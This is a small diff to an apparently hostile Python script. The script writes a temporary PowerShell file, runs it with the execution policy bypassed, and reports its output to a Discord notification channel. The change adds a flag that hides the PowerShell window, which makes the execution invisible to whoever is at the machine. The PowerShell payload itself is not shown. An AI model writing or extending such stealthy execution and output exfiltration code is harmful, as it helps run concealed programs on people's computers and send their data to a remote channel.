@@ -31,7 +31,7 @@ with tempfile.NamedTemporaryFile(delete=False, suffix='.ps1') as temp_file:
 
 try:
     send_discord_notification("trying to run")
-    result = subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-File', temp_file_path], capture_output=True, text=True)
+    result = subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-File', temp_file_path], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
     if result.returncode == 0:
         send_discord_notification('Script executed successfully\n' + result.stdout, 0x00FF00)
     else:
